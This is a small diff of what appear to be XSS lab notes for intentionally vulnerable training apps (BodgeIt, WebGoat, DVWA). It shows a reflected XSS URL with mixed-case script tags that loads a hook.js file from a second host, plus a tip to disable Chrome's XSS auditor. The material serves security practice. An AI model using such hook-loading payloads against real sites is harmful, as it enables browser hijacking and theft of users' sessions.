@@ -13,8 +13,6 @@ Or run Chrome/Chromium with `--disable-xss-auditor`
 
 `http://10.6.6.13:8080/bodgeit/search.jsp?q=<sCrIpt src='http://10.6.6.13:3000/hook.js'></ScRipT>`
 
-[Reflected XSS in WebGoat](http://10.6.6.10:8080/WebGoat-5.4/attack?Screen=20&menu=900)
-
 
 ### DVWA
 Try it on `http://owasp.local/dvwa/vulnerabilities/xss_r`
